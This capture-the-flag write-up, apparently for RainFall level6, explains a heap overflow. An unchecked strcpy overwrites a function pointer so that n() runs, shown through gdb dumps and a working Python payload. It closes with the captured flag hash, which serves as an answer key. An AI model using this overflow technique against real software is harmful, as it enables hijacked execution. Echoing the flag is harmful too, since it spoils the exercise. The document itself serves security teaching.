1. disassembling the main, we can derive the source code in `source.c`

2. call to `strcpy()` which we know is not protected, copies first argument to the memory addresses pointed to by the result of the first malloc
Line <+70> => `eax` is loaded on the stack as first argument to `strcpy`, and `eax` got its value as teh address stored at `esp+0x1c` which is where the pointer resulting from the first malloc has been stored on the stackframe (line <+21>).
Hence the memory location of this address is on the heap.

3. So we know what we have to do : we should have a sufficiently long argv[1] to erase the value at address pointed to by ptr2 (the 2nd malloc) in the heap, with the address of the `n()` function. Then, after the call to  `strcpy`, the n() function will be called and not m() (which ws loaded there line <+41 to +50>)


4. Deriving our payload.

    - Let's first break at address **0x08048491** (line<+21>) to see where the first malloc has allocated memory on the heap.
    Looking at what's in `$eax` (the register where the value returned by any function is sotred), we can find the address allocated:

    ```
    Breakpoint 1, 0x08048491 in main ()
    (gdb) disas
    Dump of assembler code for function main:
        0x0804847c <+0>:	push   ebp
        0x0804847d <+1>:	mov    ebp,esp
        0x0804847f <+3>:	and    esp,0xfffffff0
        0x08048482 <+6>:	sub    esp,0x20
        0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
        0x0804848c <+16>:	call   0x8048350 <malloc@plt>
    => 0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
        0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
        0x0804849c <+32>:	call   0x8048350 <malloc@plt>
        0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
        0x080484a5 <+41>:	mov    edx,0x8048468
        0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
        0x080484ae <+50>:	mov    DWORD PTR [eax],edx
        0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
        0x080484b3 <+55>:	add    eax,0x4
        0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
        0x080484b8 <+60>:	mov    edx,eax
        0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
        0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
        0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
        0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
        0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
        0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
        0x080484d0 <+84>:	call   eax
        0x080484d2 <+86>:	leave
        0x080484d3 <+87>:	ret
    End of assembler dump.
    (gdb) i r $eax
    eax            0x804a008	134520840
    (gdb)
    ```

    So the first malloc (i.e. where our `ptr` points to in our source.c) has allocated 64 bytes of memory at address **0x804a008**



    - Then let's break right after the second malloc, and get the address location of the memory area allocated by the 2nd malloc :

    ```
    Breakpoint 2, 0x080484a1 in main ()
    (gdb) disas
    Dump of assembler code for function main:
        0x0804847c <+0>:	push   ebp
        0x0804847d <+1>:	mov    ebp,esp
        0x0804847f <+3>:	and    esp,0xfffffff0
        0x08048482 <+6>:	sub    esp,0x20
        0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
        0x0804848c <+16>:	call   0x8048350 <malloc@plt>
        0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
        0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
        0x0804849c <+32>:	call   0x8048350 <malloc@plt>
    => 0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
        0x080484a5 <+41>:	mov    edx,0x8048468
        0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
        0x080484ae <+50>:	mov    DWORD PTR [eax],edx
        0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
        0x080484b3 <+55>:	add    eax,0x4
        0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
        0x080484b8 <+60>:	mov    edx,eax
        0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
        0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
        0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
        0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
        0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
        0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
        0x080484d0 <+84>:	call   eax
        0x080484d2 <+86>:	leave
        0x080484d3 <+87>:	ret
    End of assembler dump.
    (gdb) i r $eax
    eax            0x804a050	134520912
    ```

    So the second malloc has allocated 4 bytes of memory at address **0x804a050**

    The difference between both address is **72 bytes**, and not 64 bytes, because of alignment + part of memory allocated for memory headers.

    - If we look at stack memory values starting from $esp, we will find those values at `$esp+0x1c` and `$esp+0x18` respectively:

    ```
    (gdb) x/8wx $esp
    0xbffff670:	0x00000004	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
    0xbffff680:	0xb7fed280	0x00000000	0x0804a050	0x0804a008
    ```

    - Hence : we have to give to strcpy, through argv[1], 72 random bytes, and then the address of `n()` (**0x08048454**)


5. Payload and result:

```
level6@RainFall:~$ ./level6 $(python -c 'print("\x90"*72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
